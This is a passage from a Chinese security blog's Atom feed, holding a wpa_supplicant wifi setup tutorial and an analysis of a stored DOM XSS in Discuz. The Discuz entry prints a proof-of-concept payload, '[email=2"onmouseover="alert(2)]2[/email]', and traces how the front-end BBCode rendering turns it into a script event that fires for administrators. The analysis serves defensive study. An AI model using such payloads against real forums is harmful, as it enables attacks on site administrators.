href="http://flint.cs.yale.edu/cs422/doc/ELF_Format.pdf" target="_blank" rel="noopener">http://flint.cs.yale.edu/cs422/doc/ELF_Format.pdf</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;关于 Linux 中 ELF 文件格式可参考详细文档&lt;a href=&quot;http://flint.cs.yale.edu/cs422/doc/ELF_Format.pdf&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;《ELF_Format》&lt;/a&gt;，本文仅
      
    
    </summary>
    
    
      <category term="security" scheme="http://rickgray.me/tags/security/"/>
    
      <category term="linux" scheme="http://rickgray.me/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>wpa_supplicant - 强有力的终端 wifi 配置工具</title>
    <link href="http://rickgray.me/2015/08/03/useful-command-tool-for-wifi-connection/"/>
    <id>http://rickgray.me/2015/08/03/useful-command-tool-for-wifi-connection/</id>
    <published>2015-08-02T16:00:00.000Z</published>
    <updated>2018-04-24T15:48:57.518Z</updated>
    
    <content type="html"><![CDATA[<p>最近网购了一套<a href="https://www.raspberrypi.org/blog/raspberry-pi-2-on-sale/" target="_blank" rel="noopener">Raspberry-Pi2</a>，用来跑一些神秘脚本。因为树莓派是基于 ARM 架构的，所以给它装上了 <a href="https://wiki.ubuntu.com/ARM/RaspberryPi" target="_blank" rel="noopener">Ubuntu专版</a>，对于终端下基本的 <code>iwconfig</code> 命令可能对现代的多种加密方式的 wifi 已经不太适应了，取而代之的是支持多种加密方式（WEP, WPA and WPA2等）的 <code>wpa_supplicant</code> 更符合我的需求。</p><h3 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h3><p>Debian/Ubuntu 下直接使用 <code>sudo apt-get install wpa_supplicant</code> 来进行安装，CentOS 下使用 <code>sudo yum install wpa_supplicant</code> 来安装。</p><h3 id="二、配置并使用"><a href="#二、配置并使用" class="headerlink" title="二、配置并使用"></a>二、配置并使用</h3><p>使用 <code>iwconfig</code> 命令来查看当前机器上被识别出来的无线设备，例如这里我的树莓派上插入了一块腾达的USB无线网卡，则在系统中会得到识别。</p><p><img src="/images/articles/2015-08-03-useful-command-tool-for-wifi-connection/r-1.png" alt=""></p><p>然后在 <code>/etc/wpa_supplicant/</code> 目录下或者其它目录建立一个 wifi 的配置文件 <code>example.conf</code>，这里我创建在 <code>/etc/wpa_supplicant/example.conf</code>，并写入如下配置内容：</p><pre><code>ctrl_interface=/run/wpa_supplicantupdate_config=1</code></pre><p>这样配置是为了后面可以使用 <code>wpa_cli</code> 命令来实时地扫描和配置网络，并能狗保存配置信息。</p><p>配置文件建立完毕后，运行 <code>wpa_supplicant</code> 命令来启动无线网络接口，并加载相关配置文件。</p><pre><code>sudo wpa_supplicant -B -D nl80211 -i wlan0 -c /etc/wpa_supplicant/example.conf</code></pre><p><img src="/images/articles/2015-08-03-useful-command-tool-for-wifi-connection/r-2.png" alt=""></p><p>可以看到提示初始化成功，<code>-B</code>参数表示后台运行。如果遇到驱动不支持所插入的无线网卡，可选择<code>wired</code>或者<code>wext</code>等，具体详情可使用 <code>wpa_supplicant -h</code> 进行查看。</p><p>初始化完毕后，即可运行 <code>sudo wpa_cli</code> 来实时地配置网络。进入 <code>wpa_cli</code> 的交互界面后，它会自动地扫描周围的无线网络，你也可以使用 <code>scan</code> 命令进行手动扫描：</p><p><img src="/images/articles/2015-08-03-useful-command-tool-for-wifi-connection/r-3.png" alt=""></p><p>扫描完成后，使用 <code>scan_result</code> 打印扫描结果，选择你要连接的无线网络的 SSID（名称），然后新建一个网络配置信息（0代表了配置编号）：</p><pre><code>&gt; add_network</code></pre><p>然后对编号为 <code>1</code> 的网络配置信息进行设置：</p><pre><code>&gt; set_network 1 ssid &quot;Wifi名称&quot;&gt; set_network 1 psk &quot;Wifi密码&quot;&gt; set_network 1 key_mgmt &quot;Wifi的加密方式（WPA-PSK/WPA2-PSK）&quot;</code></pre><p>设置好后，即可使用 <code>enable_network 1</code> 来启用该配置并使用 <code>save_config</code> 来保存当前配置至 <code>/etc/wpa_supplicant/example.conf</code>。</p><p><img src="/images/articles/2015-08-03-useful-command-tool-for-wifi-connection/r-4.png" alt=""></p><p>这是可以再次使用 <code>iwconfig</code> 命令来查看无线网卡信息，可以看到已经连接上了对应的 Wifi 并有了相应的信息。</p><p><img src="/images/articles/2015-08-03-useful-command-tool-for-wifi-connection/r-5.png" alt=""></p><p>一般 Wifi 的 IP 地址获取都使用了 DHCP 协议，因此我们还需要手动 <code>dhclient wlan0</code> 来自动协商获取 IP 地址。</p><p><img src="/images/articles/2015-08-03-useful-command-tool-for-wifi-connection/r-6.png" alt=""></p><p>下次启动时可以直接使用现有配置来对之前的 Wifi 进行连接，当然不要忘了使用相应命令来进行 DCHP 协商获取 IP 地址。</p><pre><code>sudo wpa_supplicant -B -D nl80211 -i wlan0 -c /etc/wpa_supplicant/example.confsudo dhclient wlan0</code></pre><p>至此就大功告成了，终端下连接 Wifi 就是这么简单 :)</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://wiki.archlinux.org/index.php/WPA_supplicant" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/WPA_supplicant</a></li><li><a href="https://wiki.ubuntu.com/ARM/RaspberryPi" target="_blank" rel="noopener">https://wiki.ubuntu.com/ARM/RaspberryPi</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近网购了一套&lt;a href=&quot;https://www.raspberrypi.org/blog/raspberry-pi-2-on-sale/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Raspberry-Pi2&lt;/a&gt;，用来跑一些神秘脚本。因为树莓
      
    
    </summary>
    
    
      <category term="linux" scheme="http://rickgray.me/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Discuz 全版本存储 XSS 分析</title>
    <link href="http://rickgray.me/2015/07/31/discuz-all-version-stored-xss-analysis/"/>
    <id>http://rickgray.me/2015/07/31/discuz-all-version-stored-xss-analysis/</id>
    <published>2015-07-30T16:00:00.000Z</published>
    <updated>2018-04-24T15:48:57.518Z</updated>
    
    <content type="html"><![CDATA[<p>乌云上有人发了<a href="http://wooyun.org/bugs/wooyun-2010-099979" target="_blank" rel="noopener">《Discuz全版本存储型DOM XSS（可打管理员）附Discuz官方开发4大坑&amp;验证脚本》</a>，借此文顺带练习了一下 JS 调试，下面是整个漏洞的分析。</p><p>Discuz在用户评论处设置了帖子管理员编辑评论的功能，由于前端JS代码处理不当导致了经过恶意构造的评论内容在经过交互后形成XSS。下面通过payload的调试过程来解释该漏洞的形成过程。</p><p>首先，在评论处提交评论内容：<code>[email=2&quot;onmouseover=&quot;alert(2)]2[/email]</code></p><p><img src="/images/articles/2015-07-31-discuz-all-version-stored-xss-analysis/1.png" alt=""></p><p>由于服务器对引号等有过滤，所以提交后，查看源码会发现引号已经被实体编码了。</p><p><img src="/images/articles/2015-07-31-discuz-all-version-stored-xss-analysis/2.png" alt=""></p><p>对于普通用户提交的评论，管理员或者版主都有权利对其发表的评论进行管理。</p><p><img src="/images/articles/2015-07-31-discuz-all-version-stored-xss-analysis/3.png" alt=""></p><p>当管理或版主对用户的评论点击管理时，前端JS代码就开始处理，弹出一个编辑框供管理或版主操作。在JS代码处理的过程中，首先获取用户评论的内容，代码位于当前页面中：</p><p><img src="/images/articles/2015-07-31-discuz-all-version-stored-xss-analysis/4.png" alt=""></p><p>而 <code>$()</code> 函数原型位于 /static/js/common.js 中：</p><p><img src="/images/articles/2015-07-31-discuz-all-version-stored-xss-analysis/5.png" alt=""></p><p>使用了原生的 <code>document.getElementById()</code> 函数来获取页面中的对应对象，此处获取的是标有<code>id=”e_textarea”</code>的对象，其对应的值为用户评论的内容。</p><p><img src="/images/articles/2015-07-31-discuz-all-version-stored-xss-analysis/6.png" alt=""></p><p>而由于JS原生函数的原因，被服务器后端转义的引号会被重新是渲染回引号：</p><p><img src="/images/articles/2015-07-31-discuz-all-version-stored-xss-analysis/7.png" alt=""></p><p>获取到<code>id=”e_textarea”</code>对象后，代码对浏览器进行了判断，并将结果赋值给变量 <code>var wysiwyg</code>。</p><p>在页面上另一处JS代码判断了变量<code>wysiwyg</code>的值，然后开始渲染编辑框：</p><p><img src="/images/articles/2015-07-31-discuz-all-version-stored-xss-analysis/8.png" alt=""></p><p>这里使用了Firfox浏览器进行测试，在前面wysiwyg变量的值为1，所以会执行如下代码</p><pre><code>newEditor(1, bbcode2html(textobj.value))</code></pre><p>其中textobj.value的值为：<code>[email=2&quot;onmouseover=&quot;alert(2)]2[/email]</code>（经过document.getElementById()获取的对象解析了实体编码）</p><p>在进行<code>newEditor()</code>时，会对传入的内容使用函数bbcode2html()进行编码过滤，其函数原型位于/static/js/bbcode.js，下面是Discuz对程序所支持的shortcode进行处理的部分代码。</p><p><img src="/images/articles/2015-07-31-discuz-all-version-stored-xss-analysis/9.png" alt=""></p><p>程序匹配其支持的shortcode然后正则替换为相应的前端格式代码，因此次测试的payload为<code>[email=2”onmouseover=”alert(2)]2[/email]</code>，因此图中红色标注的代码会得到执行。</p><pre><code>str = str.replace(/\[email=(.[^\[]*)\](.*?)\[\/email\]/ig, &apos;&lt;a href=&quot;mailto:$1&quot; target=&quot;_blank&quot;&gt;$2&lt;/a&gt;&apos;);</code></pre><p>经过正则匹配替换后，str的值会变为：<code>&lt;a href=&quot;mailto:2&quot;onmouseover=&quot;alert(2)&quot; target=&quot;_blank&quot;&gt;2&lt;/a&gt;</code></p><p><img src="/images/articles/2015-07-31-discuz-all-version-stored-xss-analysis/10.png" alt=""></p><p>最终bbcode2html()函数会返回经过转换后的textobj.value，值为：<code>&lt;a href=&quot;mailto:2&quot;onmouseover=&quot;alert(2)&quot; target=&quot;_blank&quot;&gt;2&lt;/a&gt;</code></p><p>然后调用newEditor()函数进编辑框的渲染，其函数原型位于/static/js/editor.js</p><p><img src="/images/articles/2015-07-31-discuz-all-version-stored-xss-analysis/11.png" alt=""></p><p>从函数原型可以看到，代码再次判断浏览器类型然后开始渲染，由于wysiwyq变量的值为1，最终会执行</p><pre><code>writeEditorContents(isUndefined(initialtext) ? textobj.value: initialtext);</code></pre><p>而调用newEditor()函数时，传递了initialtext参数，其值就为经过bbcode2html()函数处理后的textobj.value的值。</p><p>前端JS最终使用writeEditorContents()函数对页面进行渲染，其过程中会将initialtext变量的值直接写入到页面中，最终形成XSS。</p><p><img src="/images/articles/2015-07-31-discuz-all-version-stored-xss-analysis/12.png" alt=""></p><p>渲染成功后，查看页面源代码：</p><p><img src="/images/articles/2015-07-31-discuz-all-version-stored-xss-analysis/13.png" alt=""></p><p>当管理员或者版主对其进行交互时就会触发alert(2)。</p><p><img src="/images/articles/2015-07-31-discuz-all-version-stored-xss-analysis/14.png" alt=""></p><p>即使后段服务器对输入内容进行了过滤和转义，但是在前段渲染的时候依然有可能形成 XSS。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;乌云上有人发了&lt;a href=&quot;http://wooyun.org/bugs/wooyun-2010-099979&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;《Discuz全版本存储型DOM XSS（可打管理员）附Discuz官方开发4大坑&amp;amp;验
      
    
    </summary>
    
    
      <category term="security" scheme="http://rickgray.me/tags/security/"/>
    
      <category term="web" scheme="http://rickgray.me/tags/web/"/>
    
      <category term="xss" scheme="http://rickgray.me/tags/xss/"/>
    
  </entry>
  
</feed>
